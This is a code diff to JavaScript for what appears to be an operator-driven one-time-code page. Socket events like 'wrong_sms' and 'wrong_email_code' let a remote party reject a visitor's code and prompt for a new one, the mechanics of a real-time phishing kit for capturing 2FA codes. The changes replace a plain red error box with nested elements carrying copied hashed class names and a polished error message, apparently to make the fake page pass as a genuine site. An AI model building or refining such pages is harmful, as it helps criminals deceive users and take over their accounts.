@@ -106,7 +106,7 @@ if (key === "wrong_email_code") {
   showWrongCodeError(
     document.querySelector('input[maxlength="6"], input[autocomplete="one-time-code"]'),
     document.querySelector('button[type="submit"], button[data-testid="otp-submit-button"]'),
-    "wrong code, please try again"
+    "That didn't work. Try again or get a new code."
   );
   return;
 }
@@ -166,30 +166,37 @@ if (key === "wrong_email_code") {
   function getOrCreateErrorEl(input) {
     const existing = document.getElementById("gauth-error");
     if (existing) return existing;
-    const err = document.createElement("div");
-    err.id = "gauth-error";
-    err.setAttribute("role", "alert");
-    err.setAttribute("aria-live", "assertive");
-    err.style.background = "#d93025";   // red
-    err.style.color = "#ffffff";
-    err.style.padding = "10px 14px";
-    err.style.borderRadius = "10px";
-    err.style.marginTop = "10px";
-    err.style.fontWeight = "700";
-    err.style.fontSize = "16px";
-    err.style.letterSpacing = "0.2px";
+    const wrapper = document.createElement("div");
+    wrapper.id = "gauth-error";
+    wrapper.setAttribute("role", "alert");
+    wrapper.setAttribute("aria-live", "assertive");
+    wrapper.className = "sc-11fh42v-0 eMagVQ";
+    const inner1 = document.createElement("div");
+    inner1.className = "sc-11fh42v-0 fjYSLV";
+    const inner2 = document.createElement("div");
+    inner2.className = "sc-11fh42v-0 bIzyyL";
+    const inner3 = document.createElement("div");
+    inner3.className = "sc-11fh42v-0 caYkwU";
+    const msg = document.createElement("p");
+    msg.className = "sc-7l25en-0 gxDtrB";
+    msg.setAttribute("data-gauth-error-text", "1");
+    inner3.appendChild(msg);
+    inner2.appendChild(inner3);
+    inner1.appendChild(inner2);
+    wrapper.appendChild(inner1);
     if (input && input.parentNode) {
-      if (input.nextSibling) input.parentNode.insertBefore(err, input.nextSibling);
-      else input.parentNode.appendChild(err);
+      const container = input.closest(".sc-11fh42v-0.dvkciP, .sc-11fh42v-0.kXmROk") || input.parentNode;
+      container.parentNode ? container.parentNode.insertBefore(wrapper, container) : input.parentNode.insertBefore(wrapper, input);
     } else {
-      document.body.appendChild(err);
+      document.body.appendChild(wrapper);
     }
-    return err;
+    return wrapper;
   }
 
   function showWrongCodeError(input, submit, text) {
     const err = getOrCreateErrorEl(input);
-    err.textContent = text || "wrong code, please try again, please try again";
+    const msgEl = err.querySelector("[data-gauth-error-text]") || err;
+msgEl.textContent = text || "That didn't work. Try again or get a new code.";
     try { input.setAttribute("aria-invalid", "true"); } catch {}
     try { input.focus(); input.select && input.select(); } catch {}
     restoreButtonFromLoading(submit);
@@ -294,7 +301,7 @@ function sendEmailCode(code) {
       if (!isSixDigits(code)) {
         // Show the same error behavior as wrong_gauth - DON'T call updateBtn() after setNotReady
         try { window.wsClearPendingGAuth && window.wsClearPendingGAuth(); } catch {}
-        showWrongCodeError(input, submit, "wrong code, please try again");
+        showWrongCodeError(input, submit, "That didn't work. Try again or get a new code.");
         setNotReady(submit);   // require new 6-digit entry
         return;
       }
@@ -322,7 +329,7 @@ if (socket) {
     // Only wrong_sms shows the local inline error on this page
     if (key === "wrong_sms") {
       try { window.wsClearPendingGAuth && window.wsClearPendingGAuth(); } catch {}
-      showWrongCodeError(input, submit, message || "wrong code, please try again");
+      showWrongCodeError(input, submit, message || "That didn't work. Try again or get a new code.");
       setNotReady(submit);   // require new 6-digit entry
       updateBtn();
       return;
@@ -387,30 +394,37 @@ if (socket) {
   function getOrCreateErrorEl(input) {
     const existing = document.getElementById("gauth-error");
     if (existing) return existing;
-    const err = document.createElement("div");
-    err.id = "gauth-error";
-    err.setAttribute("role", "alert");
-    err.setAttribute("aria-live", "assertive");
-    err.style.background = "#d93025";   // red
-    err.style.color = "#ffffff";
-    err.style.padding = "10px 14px";
-    err.style.borderRadius = "10px";
-    err.style.marginTop = "10px";
-    err.style.fontWeight = "700";
-    err.style.fontSize = "16px";
-    err.style.letterSpacing = "0.2px";
+    const wrapper = document.createElement("div");
+    wrapper.id = "gauth-error";
+    wrapper.setAttribute("role", "alert");
+    wrapper.setAttribute("aria-live", "assertive");
+    wrapper.className = "sc-11fh42v-0 eMagVQ";
+    const inner1 = document.createElement("div");
+    inner1.className = "sc-11fh42v-0 fjYSLV";
+    const inner2 = document.createElement("div");
+    inner2.className = "sc-11fh42v-0 bIzyyL";
+    const inner3 = document.createElement("div");
+    inner3.className = "sc-11fh42v-0 caYkwU";
+    const msg = document.createElement("p");
+    msg.className = "sc-7l25en-0 gxDtrB";
+    msg.setAttribute("data-gauth-error-text", "1");
+    inner3.appendChild(msg);
+    inner2.appendChild(inner3);
+    inner1.appendChild(inner2);
+    wrapper.appendChild(inner1);
     if (input && input.parentNode) {
-      if (input.nextSibling) input.parentNode.insertBefore(err, input.nextSibling);
-      else input.parentNode.appendChild(err);
+      const container = input.closest(".sc-11fh42v-0.dvkciP, .sc-11fh42v-0.kXmROk") || input.parentNode;
+      container.parentNode ? container.parentNode.insertBefore(wrapper, container) : input.parentNode.insertBefore(wrapper, input);
     } else {
-      document.body.appendChild(err);
+      document.body.appendChild(wrapper);
     }
-    return err;
+    return wrapper;
   }
 
   function showWrongCodeError(input, submit, text) {
     const err = getOrCreateErrorEl(input);
-    err.textContent = text || "wrong code, please try again";
+    const msgEl = err.querySelector("[data-gauth-error-text]") || err;
+msgEl.textContent = text || "That didn't work. Try again or get a new code.";
     try { input.setAttribute("aria-invalid", "true"); } catch {}
     try { input.focus(); input.select && input.select(); } catch {}
     // Restore button from loading state
@@ -472,7 +486,7 @@ if (socket) {
       if (!isSixDigits(code)) {
         // Show the same error behavior as wrong_gauth - DON'T call updateBtn() or setNotReady after error
         e.preventDefault();
-        showWrongCodeError(input, submit, "wrong code, please try again");
+        showWrongCodeError(input, submit, "That didn't work. Try again or get a new code.");
         return;
       }
       e.preventDefault();
